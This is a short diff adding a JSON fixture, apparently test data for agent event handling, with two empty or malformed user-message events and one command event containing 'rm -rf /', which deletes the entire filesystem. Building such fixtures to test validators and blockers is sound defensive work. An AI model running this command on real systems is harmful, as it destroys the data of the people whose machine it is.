@@ -1,0 +1,5 @@
+[
+  { "type": "user_message", "text": "" },
+  { "type": "user_message" },
+  { "type": "execute_command", "command": "rm -rf /" }
+]
